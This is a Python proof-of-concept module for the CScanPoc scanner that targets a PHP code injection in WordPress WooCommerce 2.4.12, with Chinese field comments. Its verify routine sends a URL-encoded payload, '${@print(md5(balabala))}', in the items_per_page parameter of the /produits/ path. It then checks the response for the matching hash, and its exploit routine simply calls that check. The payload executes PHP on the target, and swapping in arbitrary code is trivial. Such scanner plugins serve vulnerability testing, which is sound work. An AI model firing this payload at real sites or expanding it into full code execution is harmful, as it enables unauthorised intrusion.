# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0087'  # 平台漏洞编号，留空
    name = 'WordPress WooCommerce 2.4.12 PHP Code Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-10-20'  # 漏洞公布时间
    desc = '''
        WordPress WooCommerce 2.4.12 PHP Code Injection
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/135000/WordPress-WooCommerce-2.4.12-PHP-Code-Injection.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress WooCommerce 2.4.12'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fcff2739-11db-4c85-be17-15d8dbf876eb'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/produits/?items_per_page=%24%7b%40print(md5(balabala))%7d&setListingType=grid'
            verify_url = arg + payload
            code, head, res, errcode, _ = hh.http(verify_url)
            if code == 200 and '4fd952b7a28daf93be5457b4318554a1' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
